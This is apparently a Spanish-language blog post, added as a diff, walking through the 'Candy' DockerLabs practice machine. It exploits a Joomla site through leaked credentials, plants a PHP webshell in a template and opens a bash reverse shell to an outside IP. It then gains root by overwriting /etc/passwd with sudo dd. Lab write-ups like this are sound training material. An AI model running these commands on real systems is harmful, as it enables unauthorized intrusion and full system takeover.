@@ -1,0 +1,119 @@
+---
+layout: post
+title: "Candy"
+date: 2024-11-13
+ 13:45:23
+category: dockerlabs
+vm: dockerlabsfacil
+---
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Candy </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
+</table>
+
+<br>
+
+**1\.** Descubrimos los puertos abiertos de la maquina; tenemos solo el puerto 80 abierto y nos reporta el robots.txt activo.
+
+`sudo nmap -p- --open -T5 --min-rate=5000 -sCV -n -Pn 172.17.0.2`
+
+![img](/notas/public/img/dockerlabs/candy/nmap.png){:.margin}
+
+**2\.** En la web tenemos un panel login, si vemos el codigo fuente podemos ver que corre joomla como gestor de contenido.
+
+`http://172.17.0.2/`
+
+![img](/notas/public/img/dockerlabs/candy/webindex.png){:.margin}
+![img](/notas/public/img/dockerlabs/candy/webindexcode.png){:.margin}
+
+**3\.** Podemos usar la herramienta joomscan, pero en este caso veamos el robots.txt; vemos el directorio del administrador y al final tenemos unas credenciales , esto tambien lo podemos ver en la ruta /un_caramelo.
+
+`http://172.17.0.2/robots.txt`
+
+![img](/notas/public/img/dockerlabs/candy/robots.png){:.margin}
+![img](/notas/public/img/dockerlabs/candy/uncaramelo.png){:.margin}
+
+**4\.** Para identificar el hash la contraseña de admin podemos usar [hash_identifier](https://hashes.com/en/tools/hash_identifier), ya sabiendo que es base64 procedemos a decodearlo.
+
+`echo "c2FubHVpczEyMzQ1" | base64 -d ; echo`
+
+![img](/notas/public/img/dockerlabs/candy/hashid.png){:.margin}
+![img](/notas/public/img/dockerlabs/candy/base64decode.png){:.margin}
+
+**5\.** Vamos al panel administrativo de joomla y accedemos con las credenciales; una vez dentro vamos a system -> site_templates -> cassiopeia details and files.
+
+`http://172.17.0.2/administrator/`
+
+![img](/notas/public/img/dockerlabs/candy/joomla.png){:.margin}
+![img](/notas/public/img/dockerlabs/candy/joomlacassiopeia.png){:.margin}
+
+**6\.** Editamos el index.php le agregamos nuestro codigo para obtener un webshell.
+
+`system($_GET['cmd']);`
+
+![img](/notas/public/img/dockerlabs/candy/indexedit.png){:.margin}
+![img](/notas/public/img/dockerlabs/candy/webshellid.png){:.margin}
+
+**7\.** Nos ponemos en escucha con nc, procedemos a enviarnos la reverse shell; ya tendriamos la conexion exitosa.
+
+`nc -nlvp 4000`
+
+`bash -c "bash -i >%26 /dev/tcp/192.168.18.8/4000 0>%261"`
+
+![img](/notas/public/img/dockerlabs/candy/reverseshell.png){:.margin}
+![img](/notas/public/img/dockerlabs/candy/ncconnected.png){:.margin}
+
+**8\.** Encontramos este fichero donde tenemos las creds para ingresar aparentemente a la bd, pero esto no funciona. Lo que si funciona es migrar al usuario luisillo.
+
+`cat /var/backups/hidden/otro_caramelo.txt`
+
+`su luisillo`
+
+![img](/notas/public/img/dockerlabs/candy/dbcreds.png){:.margin}
+![img](/notas/public/img/dockerlabs/candy/suluisillo.png){:.margin}
+
+**9\.** Ahora escalamos a root aprovechando que tenemos un binario SUID. Echa un ojo en [gtfobins](https://gtfobins.github.io/gtfobins/dd/#sudo).
+
+`sudo -l`
+
+![img](/notas/public/img/dockerlabs/candy/sudol.png){:.margin}
+
+_9.1- Hacemos una copia de passwd para modificar su contenido, antes generamos una contraseña_
+
+`cat /etc/passwd > backuppasswd`
+
+`openssl passwd`
+
+![img](/notas/public/img/dockerlabs/candy/openssl.png){:.margin}
+
+_9.2- Editamos el backuppasswd y sustituimos la x por la nueva contraseña de root_
+
+`nano backuppasswd`
+
+![img](/notas/public/img/dockerlabs/candy/nanobackuppasswd.png){:.margin}
+![img](/notas/public/img/dockerlabs/candy/nanobackuppasswd2.png){:.margin}
+
+_9.3- Hacemos uso del binario dd para sobreescribir el passwd con las nuevas modificaciones; vemos que ya se modifico_
+
+`cat backuppasswd | sudo /bin/dd of=/etc/passwd`
+
+`grep root /etc/passwd`
+
+![img](/notas/public/img/dockerlabs/candy/copydd.png){:.margin}
+
+_9.4- Por ultimo migramos a root con la nueva contraseña generada_
+
+`su root`
+
+![img](/notas/public/img/dockerlabs/candy/root.png){:.margin}
+
+<br>
+
+<a href="#">_Finalizado._</a>
